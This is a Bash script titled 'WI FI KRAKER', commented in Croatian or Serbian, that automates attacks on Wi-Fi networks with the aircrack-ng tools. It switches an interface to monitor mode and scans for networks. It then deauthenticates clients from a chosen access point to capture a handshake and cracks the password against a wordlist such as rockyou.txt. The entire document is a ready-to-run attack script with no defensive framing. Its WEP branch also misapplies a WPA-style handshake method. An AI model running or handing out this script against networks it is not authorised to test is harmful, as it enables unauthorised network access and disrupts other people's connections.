#!/bin/bash
echo " __        ___   _____ _   _  __          _             "
echo " \\ \\      / (_) | ___(_) | |/ /_ __ __ _| | _____ _ __ "
echo "  \\ \\ /\\ / /| | | |_  | | | ' /| '__/ _\` | |/ / _ \\ '__|"
echo "   \\ V  V / | | |  _| | | | . \\| | | (_| |   <  __/ |   "
echo "    \\_/\\_/  |_| |_|   |_| |_|\\_\\_|  \\__,_|_|\\_\\___|_|   "
echo
echo "                    W I   F I   K R A K E R            "
echo

# ================================================
# AUTOMATSKI ODABIR PRVOG WIFI INTERFACEA
# ================================================
INTERFACE=$(iw dev | awk '$1=="Interface"{print $2; exit}')

if [ -z "$INTERFACE" ]; then
    echo "[!] Nema Wi-Fi interfejsa! Izlazim..."
    exit 1
fi

echo "[+] Pronađen Wi-Fi interfejs: $INTERFACE"

# ================================================
# PREBACIVANJE U MONITOR MODE
# ================================================
echo "[*] Prebacivanje u monitor mode..."
airmon-ng start "$INTERFACE"

MONITOR_IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E 'mon$')
if [ -z "$MONITOR_IFACE" ]; then
    MONITOR_IFACE="${INTERFACE}mon"
fi

echo "[+] Monitor interface: $MONITOR_IFACE"
sleep 2

# ================================================
# SKENIRANJE MREŽA
# ================================================
echo "[*] Pokrećem skeniranje mreža... (CTRL+C prekida)"
sleep 2
airodump-ng "$MONITOR_IFACE"

# ================================================
# ODABIR TIPA NAPADA
# ================================================
echo "[*] Odaberi tip napada:"
echo "1) WEP"
echo "2) WPA/WPA2"
read -p "[?] Odaberi opciju (1 ili 2): " OPTION

if [ "$OPTION" == "1" ]; then
    # --------------------------------------------
    # WEP NAPAD (BEZ ESSID-a)
    # --------------------------------------------
    echo "[+] WEP napad odabran."
    read -p "[?] Unesi BSSID: " BSSID
    read -p "[?] Unesi kanal: " KANAL

    xterm -hold -e "airodump-ng -c $KANAL --bssid $BSSID -w handshake $MONITOR_IFACE" &
    sleep 5
    
    xterm -hold -e "aireplay-ng -0 10 -a $BSSID $MONITOR_IFACE"

    aircrack-ng -w rjecnik.txt handshake*.cap

elif [ "$OPTION" == "2" ]; then
    # --------------------------------------------
    # WPA/WPA2 NAPAD (BEZ ESSID-a)
    # --------------------------------------------
    echo "[+] WPA/WPA2 napad odabran."
    read -p "[?] Unesi BSSID: " BSSID
    read -p "[?] Unesi kanal: " KANAL

    xterm -hold -e "airodump-ng -c $KANAL --bssid $BSSID -w handshake $MONITOR_IFACE" &
    sleep 5

    xterm -hold -e "aireplay-ng -0 5 -a $BSSID $MONITOR_IFACE"

    aircrack-ng -w rockyou.txt handshake*.cap

else
    echo "[!] Pogrešan odabir!"
    exit 1
fi

# ================================================
# POVRATAK U MANAGED MODE
# ================================================
echo "[*] Vraćam interface u managed mode..."
airmon-ng stop "$MONITOR_IFACE"
service NetworkManager restart

echo "[✓] Gotovo!"
